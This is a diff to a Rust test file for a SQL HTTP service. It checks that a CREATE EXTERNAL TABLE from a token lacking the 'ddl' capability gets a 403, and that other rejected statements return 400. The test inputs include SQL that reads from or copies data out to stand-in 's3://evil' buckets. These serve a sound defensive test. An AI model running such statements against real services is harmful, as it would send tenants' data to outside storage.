@@ -1497,11 +1497,22 @@ async fn an_unauthenticated_request_is_rejected() {
 async fn rejected_statement_kinds_return_400_over_http() {
     let app = one_tenant_app("m", &[(1, 1.0)]).await;
 
+    // A CREATE is routed to the DDL path, which a token without the `ddl`
+    // capability is refused at with 403 rather than 400.
+    let (status, value) = post_json(
+        &app,
+        "acme-token",
+        "CREATE EXTERNAL TABLE evil (a INT) STORED AS PARQUET LOCATION 's3://evil/x'",
+    )
+    .await;
+    assert_eq!(
+        status,
+        StatusCode::FORBIDDEN,
+        "create external table: {value}"
+    );
+    assert_eq!(value["errorType"], "forbidden", "{value}");
+
     for (name, sql) in [
-        (
-            "create external table",
-            "CREATE EXTERNAL TABLE evil (a INT) STORED AS PARQUET LOCATION 's3://evil/x'",
-        ),
         ("copy to", "COPY (SELECT * FROM samples) TO 's3://evil/out'"),
         ("insert", "INSERT INTO samples VALUES (1, 2.0)"),
         ("set", "SET datafusion.execution.batch_size = 1"),
